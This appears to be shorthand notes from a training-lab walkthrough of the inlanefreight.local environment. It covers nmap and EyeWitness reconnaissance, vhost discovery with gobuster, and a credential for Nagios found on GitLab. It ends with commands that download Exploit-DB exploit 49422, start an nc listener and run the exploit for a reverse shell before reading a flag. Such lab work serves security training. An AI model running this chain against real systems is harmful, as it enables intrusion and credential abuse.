```
nmap -Pn -A 10.129.230.45 -oA web_discovery
sudo apt install eyewitness
eyewitness --web -x web_discovery.xml
```
```
sudo nano /etc/hosts

10.129.230.45 inlanefreight.local gitlab.inlanefreight.local
```
```
gobuster vhost -u http://inlanefreight.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```
```
sudo nano /etc/hosts

10.129.230.45 inlanefreight.local gitlab.inlanefreight.local blog.inlanefreight.local monitoring.inlanefreight.local
```
- Found creds from gitlab.inlanefreight.local
- nagiosadmin:oilaKglm7M09@CPL&^lC

```
searchsploit nagios
wget https://www.exploit-db.com/download/49422
nc -lvnp 1234
python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.15.228 1234
ls
cat f5088a862528cbb16b4e253f1809882c_flag.txt
```
